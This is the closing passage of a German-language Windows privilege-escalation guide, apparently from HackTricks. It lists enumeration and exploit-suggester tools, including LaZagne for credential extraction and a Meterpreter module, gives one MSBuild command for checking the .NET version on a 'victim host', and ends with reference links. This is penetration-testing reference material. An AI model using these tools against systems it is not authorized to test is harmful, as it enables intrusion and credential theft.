[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Benötigt Admin-Rechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert den Host nach Fehlkonfigurationen (eher ein Informationssammel-Tool als reines Privesc-Tool) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Credentials aus vielen Programmen (vorkompilierte exe im GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (ausführbar vorkompiliert auf GitHub). Nicht empfohlen. Funktioniert nicht gut unter Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft mögliche Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert nicht gut unter Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, basierend auf diesem Post erstellt (benötigt accesschk nicht, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der korrekten Version von .NET kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Opferhost installierte .NET-Version zu sehen, kannst du folgendes tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referenzen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA-Makro-Phishing via SMTP → hMailServer Anmeldeinformationen entschlüsseln → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Auf der Spur des Silver Fox: Katze & Maus in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privilegierte Dateisystem-Schwachstelle in einem SCADA-System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Ausnutzen von Symbolic Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
